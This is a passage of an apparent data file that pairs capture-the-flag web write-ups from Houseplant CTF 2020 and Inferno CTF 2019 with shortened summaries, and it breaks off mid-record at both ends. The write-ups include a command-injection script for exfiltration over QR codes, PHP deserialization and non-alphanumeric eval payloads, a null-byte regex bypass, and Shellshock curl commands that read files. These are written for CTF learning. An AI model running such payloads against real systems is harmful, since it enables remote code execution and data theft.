  <h1>QR Generator</h1>
  <p>Generate your QR codes here!</p>
  
  <!-- TODO: Fix bug where the QR code only contains 1 character -->
  <img src />
  <input type=""text"" placeholder=""Enter text here..."" />
  <script>
    const input = document.querySelector('input');
    const img = document.querySelector('img');

    ['onkeyup', 'onchange'].forEach(action => {
      input[action] = () => {
        img.src = '/qr?text=' + encodeURIComponent(input.value)
      }
    })
  </script>
</body>
</html>
```

The endpoint of this QR code service is `http://challs.houseplant.riceteacatpanda.wtf:30004/qr`.

The QR code produced contains *only the first char inserted*. Using backticks, you can confirm the RCE. For example, sending `echo 'X'` command will return the QR code of the letter `X`.

```
http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text=`echo%20%27X%27`
```

![qr-echo-X.png](qr-echo-X.png)

You can write a [Python script](qr-generator-solver.py) to exfiltrate output of executed commands.

```python
#!/usr/bin/python

import requests
import sys
import time
import os
import base64

# pit3 install pillow
# pip3 install pyqrcode
# pip3 install pyzbar

from PIL import Image
from pyzbar.pyzbar import decode

target_url = ""http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text={}""
headers = {
   ""User-Agent"": ""Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);"",
   ""Accept-Encoding"": ""gzip, deflate"",
   ""Referer"": ""http://challs.houseplant.riceteacatpanda.wtf:30004/"",
}


def execute_command(command):
    print(""cmd > {}"".format(command))
    command_output = """"
    i = 1
    finished = False
    while not finished:
        payload = ""`{}|base64|cut -c{}`"".format(command, i)
        qr_code = http_get(payload)
        qr_code_image_name = ""qr.png""
        with open(qr_code_image_name, ""wb"") as qr_code_image:
            qr_code_image.write(qr_code)
        qr_data = decode(Image.open(qr_code_image_name))[0].data.decode(""utf-8"")
        if len(qr_data.strip()) > 0:
            command_output += qr_data
        else:
            finished = True
        os.remove(qr_code_image_name)
        i += 1
    print(base64.b64decode(command_output))


def http_get(payload):
    response = None
    response_ok = False
    while not response_ok:
        try:
            target_attacked = target_url.format(payload)
            r = requests.get(target_attacked, headers=headers)
            response = r.content
            if r.status_code == 200:
                response_ok = True
                time.sleep(1)
            else:
                print(""   ERROR!"")
                time.sleep(10)
            if ""PNG"" not in r.text:
                raise Exception(""PNG not found in response!"")
        except:
            print(""   EXCEPTION!"")
            time.sleep(5 * 60)
    return response


execute_command(sys.argv[1])
```

You can interact launching the remote commands.

```
user@vm:~$ python3 -W ignore qr-generator-solver.py whoami
cmd > whoami
b'rtcp\n'
user@vm:~$ python3 -W ignore qr-generator-solver.py ls
cmd > ls
b'README.md\napp\nflag.txt\nnode_modules\npackage.json\nstart.sh'
user@vm:~$ python3 -W ignore qr-generator-solver.py ""cat flag.txt""
cmd > cat flag.txt
b'rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}\n'
```

So the flag is the following.

```
rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}
```","The hint suggests a RCE.

Analyzing the HTML source code, an interesting comment can be found.

The endpoint of this QR code service is `/qr`.

The QR code produced contains only the first char inserted. Using backticks, you can confirm the RCE. For example, sending `echo 'X'` command will return the QR code of the letter `X`.

You can write a Python script to exfiltrate output of executed commands.

You can interact launching the remote commands in order to get the flag."
"# Houseplant CTF 2020 – Selfhost all the things!

* **Category:** web
* **Points:** 1000

## Challenge

> The amount of data that online services like Discord and Instagram collect on us is staggering, so I thought I'd selfhost a chat app!
> 
> http://challs.houseplant.riceteacatpanda.wtf:30005
> 
> The chat database is wiped every hour.
> 
> This app is called Mantle and is open source. You can find its GitHub repo at https://github.com/nektro/mantle.
> 
> Dev: Tom
>
> Hint! discord more like flag

## Solution

The webpage has a link to enter in the chat.

```html
<!DOCTYPE html>
<html lang=""en"">
    <head>
        <meta charset=""UTF-8"">
        <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
        <meta http-equiv=""X-UA-Compatible"" content=""ie=edge"">
        <title>Mantle</title>
        <link rel=""stylesheet"" href=""./css/main.min.css"">
    </head>
    <body>
        <main>
            <h1>Mantle</h1>
            <p>The new easy and effective communication platform for any successful team or community, providing you the messaging and voice platform that puts you in charge of both the conversation and the data.</p>
            <p><a href=""./login"">Enter</a></p>
        </main>
    </body>
</html>
```

Clicking on it, you will be redirected to another page where you can select the OAuth2 Identity Provider.

Choosing `discord`, the following HTTP request will be generated.

```
GET /login?with=discord HTTP/1.1
Host: challs.houseplant.riceteacatpanda.wtf:30005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30005/login
Upgrade-Insecure-Requests: 1

HTTP/1.1 302 Found
Location: https://discordapp.com/api/oauth2/authorize?client_id=<REDACTED>&duration=temporary&redirect_uri=http%3A%2F%2Fchalls.houseplant.riceteacatpanda.wtf%3A30005%2Fcallback&response_type=code&scope=identify&state=discord
Date: Fri, 24 Apr 2020 23:02:04 GMT
Content-Length: 0
Connection: close
```

You can notice that `with` HTTP GET parameter manipulation is possible.

```
GET /login?with=foo HTTP/1.1
Host: challs.houseplant.riceteacatpanda.wtf:30005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30005/login
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Fri, 24 Apr 2020 23:02:43 GMT
Content-Length: 0
Connection: close
```

Using the value `flag` will cause an interesting redirection.

```
GET /login?with=flag HTTP/1.1
Host: challs.houseplant.riceteacatpanda.wtf:30005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30005/login
Upgrade-Insecure-Requests: 1

HTTP/1.1 302 Found
Location: http://challs.houseplant.riceteacatpanda.wtf:40002?client_id=1&duration=temporary&redirect_uri=http%3A%2F%2Fchalls.houseplant.riceteacatpanda.wtf%3A30005%2Fcallback&response_type=code&scope=profile&state=flag
Date: Fri, 24 Apr 2020 23:03:06 GMT
Content-Length: 0
Connection: close
```

Following the redirection will return a webpage with the flag.

```
GET /?client_id=1&duration=temporary&redirect_uri=http%3A%2F%2Fchalls.houseplant.riceteacatpanda.wtf%3A30005%2Fcallback&response_type=code&scope=profile&state=flag HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30005/login
Upgrade-Insecure-Requests: 1
Host: challs.houseplant.riceteacatpanda.wtf:40002

HTTP/1.1 200 OK
Date: Fri, 24 Apr 2020 23:03:27 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.30
Vary: Accept-Encoding
Content-Length: 429
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
	<head>
		<title>You got the flag!</title>
		<style>
	        .container {
	            position: absolute;
	            left: 50%;
	            top: 50%;
	            transform: translate(-50%, -50%);
	        }
	        body {
	            font-family: sans-serif;
	        }
    	</style>
	</head>
	<body>
		<div class=""container"">
			<h4>rtcp{rtcp-*is-s/ort-of-se1fh0st3d}</h4>		</div>
	</body>
</html>
```

So the flag is the following.

```
rtcp{rtcp-*is-s/ort-of-se1fh0st3d}
```","The webpage has a link to enter in the chat.

Clicking on it, you will be redirected to another page where you can select the OAuth2 Identity Provider.

Choosing `discord`, the following HTTP request will be generated where you can notice that `with` HTTP GET parameter manipulation is possible.

Using the value `flag` will cause an interesting redirection.

Following the redirection will return a webpage with the flag."
"# Inferno CTF 2019 – Dank PHP

* **Category:** Web
* **Points:** 375

## Challenge

> I love Dank Memes+PHP
> 
> Link: http://104.197.168.32:17010/
> 
> Author : MrT4ntr4

## Solution

The website will show its own source code.

```php
<?php
include ""flag.php"";

show_source(__FILE__);

class user {
  var $name;
  var $pass;
  var $secret;
}

if (isset($_GET['id'])) {

  $id = $_GET['id'];

  $usr = unserialize($id);
  if ($usr) {
    $usr->secret = $flag1;
    if ($usr->name === ""admin"" && $usr->pass === $usr->secret) {
      echo ""Congratulation! Here is something for you...  "" . $usr->pass;
      if (isset($_GET['caption'])) {
        $cap = $_GET['caption'];
        if (strlen($cap) > 45) {
          die(""Naaaah, Take rest now"");
        }
        if (preg_match(""/[A-Za-z0-9]+/"", $cap)) {
          die(""Don't mess with the best language!!"");
        }
        eval($cap);
        // Try to execute echoFlag()
      } else {
        echo ""NVM You are not eligible"";
      }
    } else {
      echo ""Oh no... You can't fool me"";
    }

  } else {
    echo ""are you trolling?"";
  }

} else {
  echo ""Go and watch some Youthoob Tutorials Kidosss!!"";
}
```

You have to bypass some checks in order to get the flag. The first part of the flag, i.e. `$flag1`, is printed after the first check, the second part of the flag can be obtained executing `echoFlag()` method when the `eval($cap)` instruction is reached.

First of all you have to replicate a serialized input to pass via `id` HTTP GET parameter. This could be done with the following code.

```php
<?php
class user {
  var $name;
  var $pass;
  var $secret;
}

$usr = new user();
$usr->name = ""name"";
$usr->pass = ""pass"";
$usr->secret = ""secret"";

$id = serialize($usr);
echo $id;
```

The result is the following payload.

```
O:4:""user"":3:{s:4:""name"";s:5:""admin"";s:4:""pass"";s:4:""pass"";s:6:""secret"";s:6:""secret"";}
```

The first check to bypass is the following.

```php
    $usr->secret = $flag1;
    if ($usr->name === ""admin"" && $usr->pass === $usr->secret) {
```

This can be achieved referencing `$usr->secret` field from the `$usr->pass` field, so when the assign operation with `$flag1` will be performed, both fields will be equals.

In PHP serialization, this can be done with the `R` clause, pointing to the index of the referenced object. The crafted payload is the following.

```
O:4:""user"":3:{s:4:""name"";s:5:""admin"";s:6:""secret"";s:6:""secret"";s:4:""pass"";R:3;}
```

The complete URL is the following.

```
http://104.197.168.32:17010/?id=O:4:%22user%22:3:{s:4:%22name%22;s:5:%22admin%22;s:6:%22secret%22;s:6:%22secret%22;s:4:%22pass%22;R:3;}
```

The answer will be the following.

```
Congratulation! Here is something for you...
infernoCTF{pHp_1s_
NVM You are not eligible
```

The second check to bypass is the following.

```php
      if (isset($_GET['caption'])) {
        $cap = $_GET['caption'];
        if (strlen($cap) > 45) {
          die(""Naaaah, Take rest now"");
        }
        if (preg_match(""/[A-Za-z0-9]+/"", $cap)) {
          die(""Don't mess with the best language!!"");
        }
        eval($cap);
        // Try to execute echoFlag()
```

This is quite hard, because there are two strong constraints.

Usually, `preg_match` [can be bypassed using arrays](https://bugs.php.net/bug.php?id=69274), but in this case I was not able to use the content of the array into the `eval` instruction.

Googling around, I learned about a technique to bypass WAF using non-alfanumeric input, performing logic operations on non-alfanumeric chars using non-alfanumeric variables.

Considering the check on the length, and the overhead of this kind of payloads, probably the best way to attack the endpoint is to read another HTTP GET parameter, with non-alfanumeric name, e.g. `_`.

I found two interesting websites:
* [Bypass WAF - Php webshell without numbers and letters](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/);
* [`preg_match` Code Execution](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#preg_match-code-execution).

In the second website, there is the same scenario of the challenge, so I used it to craft my payload.

Using bitwise XOR operation in PHP, you can craft `_GET` string using non-alfanumeric chars and assign this value to a variable with a non-alfanumeric name.

```php
$_=""`{{{""^""?<>/""; // This is: ""_GET"" string.
```

Then you can specify the execution of the content of a GET parameter with the following code.

```php
${$_}[_]();       // This is $_GET[_]()
```

So the complete payload that will be executed by the `eval` instruction will be the following.

```php
$_=""`{{{""^""?<>/"";${$_}[_]();
```

Putting everything together, you can craft the final URL to invoke. The last thing to do is to specify the HTTP GET parameter called `_` where the name of the function to call will be passed.

```
http://104.197.168.32:17010/?id=O:4:%22user%22:3:{s:4:%22name%22;s:5:%22admin%22;s:6:%22secret%22;s:6:%22secret%22;s:4:%22pass%22;R:3;}&caption=$_=%22`{{{%22^%22?%3C%3E/%22;${$_}[_]();&_=echoFlag
```

The web page will give the following answer.

```
Congratulation! Here is something for you...
infernoCTF{pHp_1s_
a_h34dache}
```

So the flag is the following.

```
infernoCTF{pHp_1s_a_h34dache}
```","The website will show its own source code.

You have to bypass some checks in order to get the flag. The first part of the flag, i.e. `$flag1`, is printed after the first check, the second part of the flag can be obtained executing `echoFlag()` method when the `eval($cap)` instruction is reached.

First of all you have to replicate a serialized input to pass via `id` HTTP GET parameter.

The result is a payload with a serialized object.

The first check to bypass is the following.

[PHP code setting a value to a property ""secret"" of an object ""usr"", and checking if the object's ""name"" property is ""admin"" and the object's ""pass"" property is equal to the ""secret"" property.]

This can be achieved referencing `$usr->secret` field from the `$usr->pass` field, so when the assign operation with `$flag1` will be performed, both fields will be equals.

In PHP serialization, this can be done with the `R` clause, pointing to the index of the referenced object.

The complete URL is the following.

[URL containing query parameters, with the value of the ""id"" parameter being a serialized PHP object.]

The answer will contain the first part of the flag.

The second check to bypass is the following.

[PHP code that takes a ""caption"" parameter from the URL and performs checks on its length and content. If the caption contains only alphanumeric characters, the script will terminate with an error message. Otherwise, it will execute the caption as PHP code using the eval() function, potentially running arbitrary code.]

This is quite hard, because there are two strong constraints.

Usually, `preg_match` can be bypassed using arrays, but in this case I was not able to use the content of the array into the `eval` instruction.

Googling around, I learned about a technique to bypass WAF using non-alfanumeric input, performing logic operations on non-alfanumeric chars using non-alfanumeric variables.

Considering the check on the length, and the overhead of this kind of payloads, probably the best way to attack the endpoint is to read another HTTP GET parameter, with non-alfanumeric name, e.g. `_`.

I started crafting my payload.

Using bitwise XOR operation in PHP, you can craft `_GET` string using non-alfanumeric chars and assign this value to a variable with a non-alfanumeric name.

[A PHP code snippet that assigns the string ""GET"" to the variable $ using bitwise XOR operations.]

Then you can specify the execution of the content of a GET parameter with the following code.

[PHP code that invokes the function specified in the value of the _ parameter passed through the $_GET superglobal array.]

So the complete payload that will be executed by the `eval` instruction will be the following.

[This is an obfuscated PHP code snippet that executes a function denoted by the underscore character ""_"".]

Putting everything together, you can craft the final URL to invoke. The last thing to do is to specify the HTTP GET parameter called `_` where the name of the function to call will be passed.

The web page will give the complete flag."
"# Inferno CTF 2019 – Dante's Personal Home Page

* **Category:** Web
* **Points:** 180

## Challenge

> Dante has used some PHP on his site but it only allows magicians to enter. Show him your magical skills!!
> 
> http://104.197.168.32:17011/
> 
> Author : MrT4ntr4

## Solution

The website will show its own source code.

```php
<?php
include(""flag.php"");

if (isset ($_GET['__magic__'])) {
    $magic = $_GET['__magic__'];

    $check = urldecode($_SERVER['QUERY_STRING']); 

    if(preg_match(""/_| /i"", $check)) 
    { 
        die(""Get yourself some coffee""); 
    } 

    if (ereg (""^[a-zA-Z0-9]+$"", $magic) === FALSE)
        echo 'Only Alphanumeric accepted';
    else if (strpos ($magic, '$dark$') !== FALSE)
    {
        if (!is_array($magic)){
            echo ""Congratulations! FLAG is : "".$flag;
        }
        else{
            die(""You darn!!"");
        }
    }
    else
        {
            die(""Your magic doesn't work on me"");
        }
} else {
  show_source(__FILE__);
}
?>
```

There are a couple of checks that must be bypassed to get the flag.

The first part is the following.

```php
if (isset ($_GET['__magic__'])) {
    $magic = $_GET['__magic__'];

    $check = urldecode($_SERVER['QUERY_STRING']); 

    if(preg_match(""/_| /i"", $check)) 
    { 
        die(""Get yourself some coffee""); 
    } 
```

This check is pretty weird, because to bypass it you have to provide a GET parameter with underscores, but having a query string without underscores. So, yeah, there is a bit of magic, here...

According to [this website](https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/), PHP performs some string manipulation on input parameters' names in order to remove, for example, whitespaces and to convert characters in underscores.

This behavior can be abused crafting a string with chars that are converted to underscores, but they are not.

You can write a simple script to enumerate these chars.

```php
<?php

foreach(
        [
            ""{chr}{chr}magic__"",
            ""__magic{chr}{chr}""
        ] as $k => $arg) {
            for($i=0;$i<=255;$i++) {
                echo ""\033[999D\033[K\r"";
                echo ""["".$arg.""] check "".bin2hex(chr($i))."""";
                parse_str(str_replace(""{chr}"",chr($i),$arg).""=bla"",$o);

                if(isset($o[""__magic__""])) {
                    echo ""\033[999D\033[K\r"";
                    echo $arg."" -> "".bin2hex(chr($i))."" ("".chr($i)."")\n"";
                }
            }
            echo ""\033[999D\033[K\r"";

            echo ""\n"";
    }
```

The output of the script is the following.

```  
{chr}{chr}magic__ -> 2e (.)
{chr}{chr}magic__ -> 5f (_)

__magic{chr}{chr} -> 20 ( )
__magic{chr}{chr} -> 2b (+)
__magic{chr}{chr} -> 2e (.)
__magic{chr}{chr} -> 5f (_)
```

So you can use the `.` char to craft the URL.

```
http://104.197.168.32:17011/?..magic..=foo
```

The website will answer the following.

```
Your magic doesn't work on me
```

At this point, the other check to bypass is the following.

```php
    if (ereg (""^[a-zA-Z0-9]+$"", $magic) === FALSE)
        echo 'Only Alphanumeric accepted';
    else if (strpos ($magic, '$dark$') !== FALSE)
    {
        if (!is_array($magic)){
            echo ""Congratulations! FLAG is : "".$flag;
```

So you can insert only alphanumeric chars, but you have to insert two `$` chars.

According to [this website](https://bugs.php.net/bug.php?id=44366), you can bypass the `ereg` instruction injecting a NULL byte. The result is a string that is correctly interpreted by `strpos` and, obviously, is not an array.

The final URL is the following.

```
http://104.197.168.32:17011/?..magic..=foo%00$dark$
```

The website will print the flag.

```
Congratulations! FLAG is : infernoCTF{1_gu3ss_y0ur_m4g1c_was_w4y_t00_d4rk}
```","The website will show its own source code.

There are a couple of checks that must be bypassed to get the flag.

The first part is the following.

[PHP code that checks if the ""magic"" parameter has been passed through the GET method. It then decodes the query string and uses a regular expression to check if it contains either an underscore or a space. If so, it terminates the script with the message ""Get yourself some coffee"".]

This check is pretty weird, because to bypass it you have to provide a GET parameter with underscores, but having a query string without underscores. So, yeah, there is a bit of magic, here...

PHP performs some string manipulation on input parameters' names in order to remove, for example, whitespaces and to convert characters in underscores.

This behavior can be abused crafting a string with chars that are converted to underscores, but they are not.

You can write a simple script to enumerate these chars.

You can use the `.` char to craft the URL.

The website will answer the following with a useless string.

At this point, the other check to bypass is the following.

[PHP code that checks whether a string variable named ""magic"" contains only alphanumeric characters or if it contains the substring ""$dark$"". If the latter is true and ""magic"" is not an array, it prints out a message containing the value of a variable named ""flag"".]

So you can insert only alphanumeric chars, but you have to insert two `$` chars.

Regex bypass using POISON NULL BYTE is pergformed. The result is a string that is correctly interpreted by `strpos` and, obviously, is not an array.

The final URL will print the flag."
"# Inferno CTF 2019 – We will we will Shock You

* **Category:** Web
* **Points:** 150

## Challenge

> :)
> 
> http://104.197.168.32:17012/index.html

## Solution

The name of the challenge reminds the [*Shellshock*](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) vulnerability.

The homepage seems to be an apache2 default index, but analyzing the HTML source an interesting comment can be discovered.

```html
<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">
<html xmlns=""http://www.w3.org/1999/xhtml"">
  <head>
    <meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"" />
    <title>Apache2 Debian Default Page: It works</title>
    <style type=""text/css"" media=""screen"">
  * {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }

  body, html {
    padding: 3px 3px 3px 3px;

    background-color: #D8DBE2;

    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  }

  div.main_page {
    position: relative;
    display: table;

    width: 800px;

    margin-bottom: 3px;
    margin-left: auto;
    margin-right: auto;
    padding: 0px 0px 0px 0px;

    border-width: 2px;
    border-color: #212738;
    border-style: solid;

    background-color: #FFFFFF;

    text-align: center;
  }

  div.page_header {
    height: 99px;
    width: 100%;

    background-color: #F5F6F7;
  }

  div.page_header span {
    margin: 15px 0px 0px 50px;

    font-size: 180%;
    font-weight: bold;
  }

  div.page_header img {
    margin: 3px 0px 0px 40px;

    border: 0px 0px 0px;
  }

  div.table_of_contents {
    clear: left;

    min-width: 200px;

    margin: 3px 3px 3px 3px;

    background-color: #FFFFFF;

    text-align: left;
  }

  div.table_of_contents_item {
    clear: left;

    width: 100%;

    margin: 4px 0px 0px 0px;

    background-color: #FFFFFF;

    color: #000000;
    text-align: left;
  }

  div.table_of_contents_item a {
    margin: 6px 0px 0px 6px;
  }

  div.content_section {
    margin: 3px 3px 3px 3px;

    background-color: #FFFFFF;

    text-align: left;
  }

  div.content_section_text {
    padding: 4px 8px 4px 8px;

    color: #000000;
    font-size: 100%;
  }

  div.content_section_text pre {
    margin: 8px 0px 8px 0px;
    padding: 8px 8px 8px 8px;

    border-width: 1px;
    border-style: dotted;
    border-color: #000000;

    background-color: #F5F6F7;

    font-style: italic;
  }

  div.content_section_text p {
    margin-bottom: 6px;
  }

  div.content_section_text ul, div.content_section_text li {
    padding: 4px 8px 4px 16px;
  }

  div.section_header {
    padding: 3px 6px 3px 6px;

    background-color: #8E9CB2;

    color: #FFFFFF;
    font-weight: bold;
    font-size: 112%;
    text-align: center;
  }

  div.section_header_red {
    background-color: #CD214F;
  }

  div.section_header_grey {
    background-color: #9F9386;
  }

  .floating_element {
    position: relative;
    float: left;
  }

  div.table_of_contents_item a,
  div.content_section_text a {
    text-decoration: none;
    font-weight: bold;
  }

  div.table_of_contents_item a:link,
  div.table_of_contents_item a:visited,
  div.table_of_contents_item a:active {
    color: #000000;
  }

  div.table_of_contents_item a:hover {
    background-color: #000000;

    color: #FFFFFF;
  }

  div.content_section_text a:link,
  div.content_section_text a:visited,
   div.content_section_text a:active {
    background-color: #DCDFE6;

    color: #000000;
  }

  div.content_section_text a:hover {
    background-color: #000000;

    color: #DCDFE6;
  }

  div.validator {
  }
    </style>
  </head>
  <body>
    <div class=""main_page"">
      <div class=""page_header floating_element"">
        <img src=""/icons/openlogo-75.png"" alt=""Debian Logo"" class=""floating_element""/>
        <span class=""floating_element"">
          Apache2 Debian Default Page
        </span>
      </div>
<!--      <div class=""table_of_contents floating_element"">
        <div class=""section_header section_header_grey"">
          TABLE OF CONTENTS
        </div>
        <div class=""table_of_contents_item floating_element"">
          <a href=""#about"">About</a>
        </div>
        <div class=""table_of_contents_item floating_element"">
          <a href=""#changes"">Changes</a>
        </div>
        <div class=""table_of_contents_item floating_element"">
          <a href=""#scope"">Scope</a>
        </div>
        <div class=""table_of_contents_item floating_element"">
          <a href=""#files"">Config files</a>
        </div>
      </div>
-->
      <div class=""content_section floating_element"">


        <div class=""section_header section_header_red"">
          <div id=""about""></div>
          It works!
        </div>
        <div class=""content_section_text"">
          <p>
                This is the default welcome page used to test the correct 
                operation of the Apache2 server after installation on Debian systems.
                If you can read this page, it means that the Apache HTTP server installed at
                this site is working properly. You should <b>replace this file</b> (located at
                <tt>/var/www/html/index.html</tt>) before continuing to operate your HTTP server.
          </p>


          <p>
                If you are a normal user of this web site and don't know what this page is
                about, this probably means that the site is currently unavailable due to
                maintenance.
                If the problem persists, please contact the site's administrator.
          </p>

        </div>
        <div class=""section_header"">
          <div id=""changes""></div>
                Configuration Overview
        </div>
        <div class=""content_section_text"">
          <p>
                Debian's Apache2 default configuration is different from the
                upstream default configuration, and split into several files optimized for
                interaction with Debian tools. The configuration system is
                <b>fully documented in
                /usr/share/doc/apache2/README.Debian.gz</b>. Refer to this for the full
                documentation. Documentation for the web server itself can be
                found by accessing the <a href=""/manual"">manual</a> if the <tt>apache2-doc</tt>
                package was installed on this server.

          </p>
          <p>
                The configuration layout for an Apache2 web server installation on Debian systems is as follows:
          </p>
          <pre>
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf
          </pre>
          <ul>
                        <li>
                           <tt>apache2.conf</tt> is the main configuration
                           file. It puts the pieces together by including all remaining configuration
                           files when starting up the web server.
                        </li>

                        <li>
                           <tt>ports.conf</tt> is always included from the
                           main configuration file. It is used to determine the listening ports for
                           incoming connections, and this file can be customized anytime.
                        </li>

                        <li>
                           Configuration files in the <tt>mods-enabled/</tt>,
                           <tt>conf-enabled/</tt> and <tt>sites-enabled/</tt> directories contain
                           particular configuration snippets which manage modules, global configuration
                           fragments, or virtual host configurations, respectively.
                        </li>

                        <li>
                           They are activated by symlinking available
                           configuration files from their respective
                           *-available/ counterparts. These should be managed
                           by using our helpers
                           <tt>
                                a2enmod,
                                a2dismod,
                           </tt>
                           <tt>
                                a2ensite,
                                a2dissite,
                            </tt>
                                and
                           <tt>
                                a2enconf,
                                a2disconf
                           </tt>. See their respective man pages for detailed information.
                        </li>

                        <li>
                           The binary is called apache2. Due to the use of
                           environment variables, in the default configuration, apache2 needs to be
                           started/stopped with <tt>/etc/init.d/apache2</tt> or <tt>apache2ctl</tt>.
                           <b>Calling <tt>/usr/bin/apache2</tt> directly will not work</b> with the
                           default configuration.
                        </li>
          </ul>
        </div>

        <div class=""section_header"">
            <div id=""docroot""></div>
                Document Roots
        </div>

        <div class=""content_section_text"">
            <p>
                By default, Debian does not allow access through the web browser to
                <em>any</em> file apart of those located in <tt>/var/www</tt>,
                <a href=""http://httpd.apache.org/docs/2.4/mod/mod_userdir.html"" rel=""nofollow"">public_html</a>
                directories (when enabled) and <tt>/usr/share</tt> (for web
                applications). If your site is using a web document root
                located elsewhere (such as in <tt>/srv</tt>) you may need to whitelist your
                document root directory in <tt>/etc/apache2/apache2.conf</tt>.
            </p>
            <p>
                The default Debian document root is <tt>/var/www/html</tt>. You
                can make your own virtual hosts under /var/www. This is different
                to previous releases which provides better security out of the box.
            </p>
        </div>

        <div class=""section_header"">
          <div id=""bugs""></div>
                Reporting Problems
        </div>
        <div class=""content_section_text"">
          <p>
                Please use the <tt>reportbug</tt> tool to report bugs in the
                Apache2 package with Debian. However, check <a
                href=""http://bugs.debian.org/cgi-bin/pkgreport.cgi?ordering=normal;archive=0;src=apache2;repeatmerged=0""
                rel=""nofollow"">existing bug reports</a> before reporting a new bug.
          </p>
          <p>
                Please report bugs specific to modules (such as PHP and others)
                to respective packages, not to the web server itself.
          </p>
          <!-- bashferno.cgi -->
        </div>




      </div>
    </div>
    <div class=""validator"">
    </div>
  </body>
</html>
```

Connecting to `http://104.197.168.32:17012/bashferno.cgi` will give you the following output.

```html
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
<title>BASHFerno</title>
</head>
<body>
<p>
Hello Bashers!!
</p>
<!--Its shocking ryt-->
</body>
</html>
```

Again some hints that lead to *Shellshock*.

You can try to inject commands via `User-Agent` HTTP header.

```
foo@bar:~$ curl -v 'http://104.197.168.32:17012/bashferno.cgi' -H 'User-Agent: () { :;};echo -e ""\r\n$(/usr/bin/id)""'
*   Trying 104.197.168.32...
* TCP_NODELAY set
* Connected to 104.197.168.32 (104.197.168.32) port 17012 (#0)
> GET /bashferno.cgi HTTP/1.1
> Host: 104.197.168.32:17012
> Accept: */*
> User-Agent: () { :;};echo -e ""\r\n$(/usr/bin/id)""
>
< HTTP/1.1 200 OK
< Date: Fri, 27 Dec 2019 18:30:09 GMT
< Server: Apache/2.4.10 (Debian)
< Transfer-Encoding: chunked
<
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Content-type: text/html

<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
<title>BASHFerno</title>
</head>
<body>
<p>
Hello Bashers!!
</p>
<!--Its shocking ryt-->
</body>
</html>
* Connection #0 to host 104.197.168.32 left intact



foo@bar:~$ curl -v 'http://104.197.168.32:17012/bashferno.cgi' -H 'User-Agent: () { :;};echo -e ""\r\n$(/bin/ls .)""'
*   Trying 104.197.168.32...
* TCP_NODELAY set
* Connected to 104.197.168.32 (104.197.168.32) port 17012 (#0)
> GET /bashferno.cgi HTTP/1.1
> Host: 104.197.168.32:17012
> Accept: */*
> User-Agent: () { :;};echo -e ""\r\n$(/bin/ls .)""
>
< HTTP/1.1 200 OK
< Date: Fri, 27 Dec 2019 18:32:42 GMT
< Server: Apache/2.4.10 (Debian)
< Transfer-Encoding: chunked
<
bashferno.cgi
flag_for_this_INFERNO.txt
index.html
Content-type: text/html

<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
<title>BASHFerno</title>
</head>
<body>
<p>
Hello Bashers!!
</p>
<!--Its shocking ryt-->
</body>
</html>
* Connection #0 to host 104.197.168.32 left intact
```

The `ls` payload will reveal the presence of a `flag_for_this_INFERNO.txt` file that can be easily downloaded with the following URL.

```
http://104.197.168.32:17012/flag_for_this_INFERNO.txt
```

The file will contain the flag.

```
infernoCTF{F33l_Th3_Sh0ck}
```","The name of the challenge reminds the Shellshock vulnerability.

The homepage seems to be an apache2 default index, but analyzing the HTML source an interesting comment can be discovered.

Connecting to `/bashferno.cgi` will give you some hints that lead to Shellshock.

You can try to inject commands via `User-Agent` HTTP header.

The `ls` payload will reveal the presence of a `flag.txt` file that can be easily downloaded.

The file will contain the flag.
"
"# Insomni'hack teaser 2020 – LowDeep

* **Category:** web
* **Points:** 36

## Challenge

